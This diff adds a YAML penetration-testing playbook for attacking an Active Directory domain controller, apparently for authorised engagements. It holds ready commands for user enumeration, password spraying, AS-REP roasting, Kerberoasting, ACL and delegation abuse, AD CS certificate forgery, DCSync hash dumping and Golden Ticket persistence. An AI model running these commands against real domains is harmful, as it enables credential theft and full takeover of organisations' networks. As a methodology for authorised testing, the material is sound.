@@ -1,0 +1,226 @@
+name: "Domain Controller"
+version: "1.0.0"
+author: "HackMind"
+tier: asset
+description: >
+  Active Directory attack methodology against a domain / Domain Controller asset.
+  Covers enumeration (BloodHound, users/groups, GPO/ACLs, trusts, AD CS), credential
+  attacks (AS-REP roasting, Kerberoasting, password spraying), privilege-escalation
+  paths to Domain Admin (ACL abuse, delegation, AD CS ESC, coercion, DCSync), and
+  domain persistence. Network-level steps (poisoning, relay, pivoting) live in the
+  parent Internal Network asset.
+
+nodes:
+  - id: dc_overview
+    type: info
+    title: "Domain Controller — orientation"
+    content: |
+      Point this asset at a domain (identified by a Domain Controller). Most attacks
+      below assume you can reach the DC on the network; many need at least one valid
+      domain credential. Use the position question first, collect data with BloodHound,
+      then work the credential and escalation sections toward Domain Admin.
+
+      Record: domain/forest name, DC IPs, functional level, and any creds obtained.
+
+  - id: q_dc_creds
+    type: question
+    title: "Do you already have valid domain credentials?"
+    options:
+      - label: "No — network access only (pre-auth)"
+        key: "no"
+        children:
+          - id: dc_preauth
+            type: checklist
+            title: "Pre-auth footholds (no credentials yet)"
+            content: |
+              Get a username list, then attack without a password:
+              - User enumeration: kerbrute userenum -d <domain> --dc <DC> users.txt
+                (valid users return without pre-auth error); RID cycling via null SMB
+                (enum4linux-ng) on the parent Internal Network asset
+              - AS-REP roasting (see node below) — works with just a username list
+              - Coercion -> NTLM relay (PetitPotam / PrinterBug): run from the Internal
+                Network asset to relay DC/host auth to LDAP or AD CS (ESC8)
+              - Once you obtain any valid credential, work the Enumeration, Credential
+                Attacks, and Escalation sections below.
+      - label: "Yes — at least one valid domain account"
+        key: "yes"
+        children: []
+
+  - id: dc_enum
+    type: info
+    title: "AD Enumeration"
+    content: "Map users, groups, ACLs, GPOs, trusts, and AD CS to find attack paths."
+    children:
+      - id: dc_bloodhound
+        type: checklist
+        title: "BloodHound collection"
+        content: |
+          Collect the graph, then let it find the paths:
+          - bloodhound-python -u <user> -p <pass> -d <domain> -c All --zip
+          - SharpHound.exe -c All --zipfilename bh.zip   (from a domain-joined host)
+          - certipy / ldap collectors for AD CS data
+
+          Built-in / community queries to run:
+          - Shortest path to Domain Admins
+          - AS-REP roastable users / Kerberoastable users
+          - Principals with DCSync rights
+          - Computers where Domain Users are local admin
+          - Unconstrained / constrained / RBCD delegation
+          - Dangerous ACL edges (WriteDACL, GenericAll, GenericWrite, WriteOwner, AddSelf)
+
+      - id: dc_users_groups
+        type: checklist
+        title: "User and group enumeration"
+        content: |
+          - crackmapexec smb <DC> -u <user> -p <pass> --users --groups
+          - ldapsearch -x -H ldap://<DC> -D "<user>@<domain>" -w <pass> -b "DC=domain,DC=com" "(objectClass=user)"
+          - net user /domain ; net group "Domain Admins" /domain   (from Windows)
+          Flag: accounts with SPNs (Kerberoast), DONT_REQ_PREAUTH (AS-REP),
+          adminCount=1, passwords in the description field, stale/old accounts.
+
+      - id: dc_gpo_acl
+        type: checklist
+        title: "GPO and ACL review"
+        content: |
+          - BloodHound edges: WriteDACL, GenericAll, GenericWrite, WriteOwner, AddSelf
+          - PowerView: Get-DomainGPO, Get-DomainObjectAcl -ResolveGUIDs
+          - GPOs that grant local admin or run scripts on domain computers
+          - Objects where low-privilege users have write access (-> ACL abuse below)
+
+      - id: dc_trusts
+        type: checklist
+        title: "Domain and forest trusts"
+        content: |
+          - nltest /domain_trusts ; Get-DomainTrust (PowerView)
+          - BloodHound: Map Domain Trusts
+          - Note external/forest trusts, SID filtering disabled (cross-forest golden ticket),
+            and foreign group memberships granting access across domains.
+
+      - id: dc_adcs_enum
+        type: checklist
+        title: "AD CS enumeration"
+        content: |
+          - certipy find -u <user>@<domain> -p <pass> -dc-ip <DC> -stdout -vulnerable
+          - Note any ESC1–ESC8 misconfiguration and the enrollable templates/CAs
+          - Feeds the AD CS escalation node below.
+
+  - id: dc_credattacks
+    type: info
+    title: "Credential Attacks"
+    content: "Extract or guess credentials via Kerberos and spraying."
+    children:
+      - id: dc_asrep
+        type: checklist
+        title: "AS-REP Roasting"
+        content: |
+          Target accounts with "Do not require Kerberos pre-authentication":
+          - impacket-GetNPUsers <domain>/ -dc-ip <DC> -usersfile users.txt -no-pass -format hashcat -outputfile asrep.txt
+            (no password required — only a username list)
+          - Crack: hashcat -m 18200 asrep.txt rockyou.txt -r best64.rule
+
+      - id: dc_kerberoast
+        type: checklist
+        title: "Kerberoasting"
+        content: |
+          Request TGS tickets for service accounts (needs a valid domain user):
+          - impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <DC> -request -outputfile spn.txt
+          - crackmapexec ldap <DC> -u <user> -p <pass> --kerberoasting spn.txt
+          - Crack: hashcat -m 13100 spn.txt rockyou.txt -r best64.rule
+          - Targeted: with GenericWrite on a user, set an SPN, roast, then remove it.
+
+      - id: dc_spray
+        type: checklist
+        title: "Password spraying"
+        content: |
+          CAUTION: check lockout first (cme <DC> -u <user> -p <pass> --pass-pol /
+          net accounts /domain). Spray no more than 2–3 attempts per lockout window.
+          - crackmapexec smb <DC> -u users.txt -p 'Season2025!' --continue-on-success
+          - kerbrute passwordspray -d <domain> --dc <DC> users.txt 'Season2025!'
+          Candidates: Season+Year, Company+Year, Welcome1, Password1, blank for service accounts.
+
+  - id: dc_privesc
+    type: info
+    title: "Privilege Escalation to Domain Admin"
+    content: "Work BloodHound paths and AD misconfigurations toward domain dominance."
+    children:
+      - id: dc_acl_abuse
+        type: checklist
+        title: "ACL / object abuse"
+        content: |
+          From BloodHound edges:
+          - GenericAll / GenericWrite on a user -> set SPN (targeted Kerberoast),
+            force-change password, or add Shadow Credentials (msDS-KeyCredentialLink)
+          - GenericAll on a group -> add yourself
+          - WriteDACL on the domain -> grant yourself DCSync rights
+          - WriteOwner -> take ownership, then rewrite the DACL
+          Tools: PowerView, bloodyAD, impacket (dacledit, owneredit, addcomputer), certipy, pyWhisker
+
+      - id: dc_delegation
+        type: checklist
+        title: "Kerberos delegation abuse"
+        content: |
+          - Unconstrained delegation host: coerce a DC to authenticate to it
+            (PrinterBug / PetitPotam) and capture its TGT (Rubeus monitor) -> DCSync
+          - Constrained delegation: s4u2proxy abuse to impersonate any user to the SPN
+            (Rubeus s4u / impacket getST -impersonate Administrator)
+          - RBCD: with GenericWrite on a computer, set msDS-AllowedToActOnBehalfOfOtherIdentity
+            to a controlled account, then S4U to get a privileged ticket to that host.
+
+      - id: dc_adcs_esc
+        type: checklist
+        title: "AD CS escalation (ESC1–ESC8)"
+        content: |
+          Using certipy find output:
+          - ESC1: template allows enrollee-supplied subject -> request as a DA:
+            certipy req -u <user>@<domain> -p <pass> -ca <CA> -template <tmpl> -upn administrator@<domain>
+          - ESC8: relay NTLM auth to the CA web enrolment (run relay from Internal Network)
+          - ESC2/3/4/6/7: misconfigured EKUs, enrollment agents, or template/CA ACLs
+          - Authenticate with the cert: certipy auth -pfx administrator.pfx -dc-ip <DC>
+
+      - id: dc_coercion
+        type: checklist
+        title: "Authentication coercion"
+        content: |
+          Force a target (often a DC) to authenticate to a host you control:
+          - PetitPotam.py / coercer / printerbug.py / DFSCoerce
+          - Combine with NTLM relay (Internal Network asset) to LDAP/LDAPS (RBCD) or
+            AD CS web enrolment (ESC8) for escalation to DA.
+
+      - id: dc_dcsync
+        type: checklist
+        title: "DCSync (extract domain hashes)"
+        content: |
+          With Replicating Directory Changes (All) — held by DAs or granted via WriteDACL:
+          - impacket-secretsdump <domain>/<user>:<pass>@<DC> -just-dc
+          - mimikatz: lsadump::dcsync /user:<domain>\krbtgt
+          Captures all domain NTLM hashes including krbtgt (enables Golden Ticket).
+
+  - id: q_dc_persistence
+    type: question
+    title: "Is domain persistence in scope (explicitly authorised in the SOW)?"
+    options:
+      - label: "Yes"
+        key: "yes"
+        children:
+          - id: dc_persistence
+            type: checklist
+            title: "Domain persistence techniques"
+            content: |
+              Only if explicitly authorised — document every change for cleanup:
+              - Golden Ticket: mimikatz kerberos::golden /domain /sid /krbtgt:<hash> /user:Administrator
+              - Silver Ticket for a specific service (no DC contact)
+              - Golden Certificate: forge with the stolen CA private key (certipy)
+              - AdminSDHolder / DCSync rights grant / new DA account
+              - Skeleton Key (very intrusive — rarely appropriate)
+      - label: "No"
+        key: "no"
+        children: []
+
+  - id: dc_evidence
+    type: checklist
+    title: "Capture evidence of domain compromise"
+    content: |
+      - impacket-secretsdump <domain>/Administrator@<DC> -just-dc  (NTDS.dit hashes)
+      - Screenshot: whoami /all + net group "Domain Admins" /domain proving membership
+      - Capture the krbtgt hash (proof for Golden Ticket capability)
+      - Note timestamp, source host, and method for the report's attack narrative.
